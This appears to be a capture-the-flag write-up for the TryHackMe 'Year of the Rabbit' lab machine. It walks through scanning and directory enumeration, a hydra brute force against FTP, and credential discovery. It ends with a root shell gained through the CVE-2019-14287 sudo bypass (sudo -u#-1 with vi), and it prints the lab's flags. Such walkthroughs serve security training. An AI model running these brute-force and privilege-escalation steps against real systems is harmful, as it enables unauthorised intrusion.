# Year of the Rabbit

Time to enter the warren...

Can you hack into the Year of the Rabbit box without falling down a hole?

(Please ensure your volume is turned up!)

# Discovery

Let's start with an Nmap scan:

~~~
$ nmap -sV -sC -A 10.10.188.161
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-18 17:48 CEST
Nmap scan report for 10.10.188.161
Host is up (0.065s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
~~~

3 ports are discovered (ftp, ssh, http). Let's start with web.

# http

## dirsearch

Let's use `dirsearch` to discover hidden directories:

~~~
$ /data/src/dirsearch/dirsearch.py -u http://10.10.188.161/ -E -w /data/src/wordlists/directory-list-2.3-medium.txt 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, js, html, do, action | HTTP method: get | Threads: 10 | Wordlist size: 220529

Error Log: /data/src/dirsearch/logs/errors-20-05-18_17-52-10.log

Target: http://10.10.188.161/

[17:52:10] Starting: 
[17:52:11] 200 -    8KB - /
[17:52:12] 301 -  315B  - /assets  ->  http://10.10.188.161/assets/
[17:52:13] 403 -  278B  - /.hta
[18:05:00] 403 -  278B  - /server-status
CTRL+C detected: Pausing threads, please wait...[e]xit / [c]ontinue: e

~~~

The `/assets` directory contains `styles.css` which reveals a new page: `/sup3r_s3cr3t_fl4g.php`.

~~~
$ curl -s http://10.10.188.161/assets/style.css | head -n 20
 * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }

  body, html {
    padding: 3px 3px 3px 3px;

    background-color: #D8DBE2;

    font-family: Verdana, sans-serif;
    font-size: 11pt;
    text-align: center;
  }
  /* Nice to see someone checking the stylesheets.
     Take a look at the page: /sup3r_s3cr3t_fl4g.php
  */
  div.main_page {
    position: relative;
    display: table;
~~~

Let's download the page.

~~~
$ wget http://10.10.188.161/sup3r_s3cr3t_fl4g.php
--2020-05-18 17:55:39--  http://10.10.188.161/sup3r_s3cr3t_fl4g.php
Connecting to 10.10.188.161:80... connected.
HTTP request sent, awaiting response... 302 Found
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU [following]
--2020-05-18 17:55:40--  http://10.10.188.161/intermediary.php?hidden_directory=/WExYY2Cv-qU
Reusing existing connection to 10.10.188.161:80.
HTTP request sent, awaiting response... 302 Found
Location: /sup3r_s3cret_fl4g [following]
--2020-05-18 17:55:40--  http://10.10.188.161/sup3r_s3cret_fl4g
Reusing existing connection to 10.10.188.161:80.
HTTP request sent, awaiting response... 301 Moved Permanently
Location: http://10.10.188.161/sup3r_s3cret_fl4g/ [following]
--2020-05-18 17:55:40--  http://10.10.188.161/sup3r_s3cret_fl4g/
Reusing existing connection to 10.10.188.161:80.
HTTP request sent, awaiting response... 200 OK
Length: 611 [text/html]
Saving to: ‘sup3r_s3cr3t_fl4g.php’

sup3r_s3cr3t_fl4g.php                   100%[============================================================================>]     611  --.-KB/s    in 0s      

2020-05-18 17:55:40 (37.7 MB/s) - ‘sup3r_s3cr3t_fl4g.php’ saved [611/611]

unknown@localhost:/data/documents/challenges/TryHackMe/Year_of_the_Rabbit/files/assets$ ll
total 91060
-rw-rw-r--. 1 unknown unknown 93239576 May 18 17:55 RickRolled.mp4
-rw-rw-r--. 1 unknown unknown      611 Jan 23 01:34 sup3r_s3cr3t_fl4g.php
unknown@localhost:/data/documents/challenges/TryHackMe/Year_of_the_Rabbit/files/assets$ cat sup3r_s3cr3t_fl4g.php 
<html>
	<head>
		<title>sup3r_s3cr3t_fl4g</title>
	</head>
	<body>
		<noscript>Love it when people block Javascript...<br></noscript>
		<noscript>This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!<br>Make sure your audio is turned up!<br></noscript>
		<script>
			alert("Word of advice... Turn off your javascript...");
			window.location = "https://www.youtube.com/watch?v=dQw4w9WgXcQ?autoplay=1";
		</script>
		<video controls>
			<source src="/assets/RickRolled.mp4" type="video/mp4">
		</video>
	</body>
</html>
~~~

Having a close look at the redirections, notice the following page:

~~~
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU [following]
~~~

The `/WExYY2Cv-qU` directory contains a picture that contains interesting strings:

~~~
$ wget http://10.10.188.161/WExYY2Cv-qU/Hot_Babe.png
$ strings Hot_Babe.png
...[SNIP]...
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
Mou+56n%QK8sr
1618B0AUshw1M
...[SNIP]...
~~~

We now have a username (`ftpuser`). And potential passwords. Save as `wordlist.txt`.

# ftp

Let's crack the FTP account with hydra:

~~~
$ hydra -l ftpuser -P files/wordlist.txt -t4 ftp://10.10.188.161 -vv
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-18 18:34:51
[DATA] max 4 tasks per 1 server, overall 4 tasks, 82 login tries (l:1/p:82), ~21 tries per task
[DATA] attacking ftp://10.10.188.161:21/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[21][ftp] host: 10.10.188.161   login: ftpuser   password: 5iez1wGXKfPKQ
[STATUS] attack finished for 10.10.188.161 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-18 18:35:48
~~~

Hydra found the password: `5iez1wGXKfPKQ`. Let's connect:

~~~
$ ftp 10.10.188.161
Connected to 10.10.188.161 (10.10.188.161).
220 (vsFTPd 3.0.2)
Name (10.10.188.161:unknown): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
227 Entering Passive Mode (10,10,188,161,30,170).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 23 01:49 .
drwxr-xr-x    2 0        0            4096 Jan 23 01:49 ..
-rw-r--r--    1 0        0             758 Jan 23 01:48 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
227 Entering Passive Mode (10,10,188,161,220,87).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
226 Transfer complete.
758 bytes received in 0.00109 secs (695.41 Kbytes/sec)
ftp> quit
221 Goodbye.
~~~

We were able to get a file (`Eli's_Creds.txt`). It contains weird characters, this is brainfuck language.

~~~
$ cat Eli\'s_Creds.txt 
+++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
<]>+. <+++[ ->--- <]>-- ---.- ----. <
~~~

Let's use this [online resource](https://www.splitbrain.org/_static/ook/) to decode the message:
* User: eli
* Password: DSpDiM1wAEwid

#ssh

Connect with SSH using these new credentials:

~~~
$ ssh eli@10.10.188.161
The authenticity of host '10.10.188.161 (10.10.188.161)' can't be established.
ECDSA key fingerprint is SHA256:ISBm3muLdVA/w4A1cm7QOQQOCSMRlPdDp/x8CNpbJc8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.188.161' (ECDSA) to the list of known hosts.
eli@10.10.188.161's password: 


1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
~~~

The banner message is interesting. Let's try to find the secret location:

~~~
$ find / -name "*s3cr3t*" 2>/dev/null
/var/www/html/sup3r_s3cr3t_fl4g.php
/usr/games/s3cr3t
$ ls -la /usr/games/s3cr3t
total 12
137186 drwxr-xr-x 2 root root 4096 Jan 23 00:46 .
133446 drwxr-xr-x 3 root root 4096 Jan 23 00:45 ..
 36980 -rw-r--r-- 1 root root  138 Jan 23 00:46 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
eli@year-of-the-rabbit:/home/gwendoline$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
~~~

Not too hard. We now have Gwendoline's password: `MniVCQVhQHUNI`. Let's switch to `gwendoline` and get the user flag.

~~~
eli@year-of-the-rabbit:/home$ su - gwendoline
Password: 
gwendoline@year-of-the-rabbit:~$ ls -l
total 24
43036 drwxr-xr-x 2 gwendoline gwendoline 4096 Jan 23 00:49 .
  173 drwxr-xr-x 4 root       root       4096 Jan 23 00:55 ..
43000 lrwxrwxrwx 1 root       root          9 Jan 23 00:17 .bash_history -> /dev/null
43039 -rw-r--r-- 1 gwendoline gwendoline  220 Jan 23 00:16 .bash_logout
43038 -rw-r--r-- 1 gwendoline gwendoline 3515 Jan 23 00:16 .bashrc
43037 -rw-r--r-- 1 gwendoline gwendoline  675 Jan 23 00:16 .profile
36968 -r--r----- 1 gwendoline gwendoline   46 Jan 23 00:42 user.txt
gwendoline@year-of-the-rabbit:~$ cat user.txt 
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
~~~

# Escalation

Let's check Gwendoline's privileges:

~~~
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
~~~

We can run `/usr/bin/vi /home/gwendoline/user.txt` (owned by root) as any user but root, without password.

Let's exploit the CVE-2019-14287 vulnerability:

*"A flaw was found in the way sudo implemented running commands with arbitrary user ID. If a sudoers entry is written to allow the attacker to run a command as any user except root, this flaw can be used by the attacker to bypass that restriction."*

~~~
$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
~~~

Once in `vi`, use `:!/sh` to open a shell:

~~~
# whoami
root
# cd /root
# ls
root.txt
# cat ro	
cat: ro: No such file or directory
# cat root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
~~~
